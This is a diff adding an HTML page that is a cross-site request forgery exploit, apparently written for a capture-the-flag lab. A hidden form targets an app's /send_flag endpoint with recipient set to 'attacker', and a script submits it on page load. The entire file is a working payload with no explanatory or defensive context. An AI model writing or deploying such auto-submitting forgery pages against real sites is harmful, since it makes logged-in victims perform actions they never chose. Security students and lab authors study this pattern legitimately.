@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+<form id="evil" action="http://app:5000/send_flag" method="POST">
+    <input type="hidden" name="recipient" value="attacker">
+</form>
+<script>
+    document.getElementById('evil').submit();
+</script>
+</body>
+</html>
